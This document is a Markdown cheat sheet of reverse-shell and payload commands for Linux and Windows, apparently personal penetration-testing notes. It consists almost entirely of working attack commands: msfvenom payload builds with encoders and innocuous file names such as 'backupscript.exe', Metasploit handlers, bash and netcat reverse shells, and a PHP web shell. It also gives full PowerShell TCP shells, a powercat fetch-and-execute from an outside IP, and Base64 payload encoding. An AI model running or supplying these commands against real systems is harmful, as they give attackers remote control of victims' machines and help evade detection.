

# Linux
## MSFVENOM

```
msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64  
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=LHOST -f elf -o backupjob LPORT=LPORT  
  
```

## Metasploit Handler  

```
use exploit/multi/handler  
set payload linux/x64/meterpreter/reverse_tcp  
set lhost 0.0.0.0  
set lport 8000  
run  
msfconsole -q -x 'use exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set lhost tun0;run'  
```
  
## BASH
```
bash -i >& /dev/tcp/$IP/$PORT 0>&1  
```
  
  
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $IP $PORT >/tmp/f  
```
  
  
  
## Upgrade to meterpreter   
```
post/multi/manage/shell_to_meterpreter  
```
```
bash -i >& /dev/tcp/192.168.45.245/4444 0>&1  
```
  
# PHP

```
<?php system($_GET["cmd"])>
```

# Windows

## MSFVENOM


### Callback payload  

```bash
# meterpreter stager  
msfvenom -p windows/x64/meterpreter/reverse_https lhost=$CBTARGET -f exe -o backupscript.exe LPORT=$CBPORT  
```
  
```bash
meterpreter non-stager  
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.15.7 -f exe -o cbshell.exe LPORT=54123  
```
  
### non-meterpreter  
  
#### non-staged exe-service  
```
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.215 -f exe-service -o cbshell.exe LPORT=43210 -a x64 --platform Windows  
```
  
#### non-staged exe  
```
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.215 -f exe -o cbshell.exe LPORT=43210 -a x64 --platform Windows -b '\x00' -e x64/xor_dynamic  
```
  
  
### Metasploit Handler  

```
use exploit/multi/handler  
set payload windows/x64/meterpreter/reverse_https  
set lhost 0.0.0.0  
set lport 8000  
run  
  
msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set lhost tun0; set lport 443;run'  
```
  
### Powershell
```
$LHOST = "<IPADDRESS>"; $LPORT = <PORT>; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()  
```
  

## Upgrade to meterpreter   
```
post/multi/manage/shell_to_meterpreter  
```
  
  
## PowerCAT  
```
iwr -uri http://127.0.0.1/powercat.ps1;powercat -c 127.0.0.1 -p 4444 -e powershell  
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"  
```
  
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.157 LPORT=9999 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"  
```
  
  
## Base64 encoded powershell  

  
```powershell
pwsh ->  
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.157",9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'   
```
  
```powershell
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)  
  
$EncodedText =[Convert]::ToBase64String($Bytes)  
  
$EncodedText  
  
  
certutil -urlcache -split -f http://10.10.14.128/test test.test
```